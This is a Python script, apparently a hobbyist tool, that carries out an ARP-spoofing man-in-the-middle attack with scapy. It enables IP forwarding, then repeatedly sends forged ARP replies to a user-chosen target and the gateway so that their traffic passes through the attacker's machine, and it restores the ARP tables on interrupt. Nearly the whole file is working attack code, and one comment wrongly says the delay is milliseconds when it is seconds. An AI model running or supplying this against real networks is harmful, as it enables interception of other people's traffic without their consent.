#!/usr/bin/env python3

import scapy.all as scapy
from scapy import *
import time
import subprocess
import re

class MAC_SPOOF():

    def enable_ip_forward(self): # function to enable IP forward so that connectivity is still there in Target.
        command = "echo 1 > /proc/sys/net/ipv4/ip_forward" # command to enable ip_forward.
        subprocess.Popen(command, shell=True) # using subprocess to execute system command.

    def get_mac(self, ip):  #function to get mac
        self.ip =ip
        arp_request_packet = scapy.ARP(pdst=self.ip) #sending arp request packet to get the MAC.
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # sending a broadcast packet to all the devices on the network.
        arp_request_broadcast = broadcast_packet / arp_request_packet # combining the ARP and broadcast packet in a single packet.
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0] # answered list to contain the devices that responed to arp packet. #scapy.srp returns 2 lists one answered and the other unanswered thats why [0] to store only the answered list.
        if answered_list:
            answered_list_details = answered_list[0] #details of only answered list
            MAC = answered_list_details[1].hwsrc # getting only the MAC address from the details.
            return (MAC)
        else:
            pass

    def spoof(self, target_ip, spoof_ip):  # function to spoof the target.
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        target_mac = self.get_mac(self.target_ip) # getting MAC of the target IP
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.spoof_ip) # creating spoof packet with fake source IP to the target.
        scapy.send(packet, verbose = False) # sending the packet with verbose false to supress the out results on screen.

    def restore(self, destination_ip, source_ip):  # function to restore the ARP table of the targets.
        self.destination_ip = destination_ip
        self.source_ip = source_ip
        destination_mac = self.get_mac(self.destination_ip)
        source_mac = self.get_mac(self.source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = self.source_ip , hwsrc = source_mac)
        scapy.send(packet, count=4, verbose=False)
    
    def validate_ip(self, ip): # function to validate IP format
        self.ip = ip
        regex = r"(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9]?)(\.(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9]?)){3}" # regex pattern to validate IP format.
        p = re.compile(regex)
        if (re.search(p, self.ip)):
            return True
        else:
            print("[-] Invalid IP format, Please enter a valid IP format.")
            exit()

if __name__ == '__main__':

    mc = MAC_SPOOF()

    mc.enable_ip_forward()

    print("[+] Enter the target IP.")
    target_ip = input("[+] ")
    valid_target = mc.validate_ip(target_ip)
    if (valid_target):
        print("[+] Enter the gateway IP.")
        spoof_ip = input("[+] ")
        valid_spoof = mc.validate_ip(spoof_ip)
        if (valid_spoof):
            try:
                packets_sent = 0 # total number of packets sent after program start.
                while True:
                    packets_sent += 2 # in one function call 2 packets are sent to the target hence +2.
                    mc.spoof(target_ip, spoof_ip) # spoofing the target.
                    mc.spoof(spoof_ip, target_ip) # spoofing the gateway.
                    time.sleep(2) # sleep for 2 miliseconds before sending next packet so as to not overflood the target.
                    print("\r[+] " + "Sent " + str(packets_sent) + " Packets.", end ="")

            except KeyboardInterrupt: # if keyboard interrupted
                print("\n[-] Keyboard Interrupt Triggered")
                print("[+] Restoring ARP Table")
                mc.restore(target_ip, spoof_ip) # restore the target's ARP table.
                mc.restore(spoof_ip, target_ip) # restore the gateway's ARP table.
                print("[+] Restored everything to previous state.")    

            



   
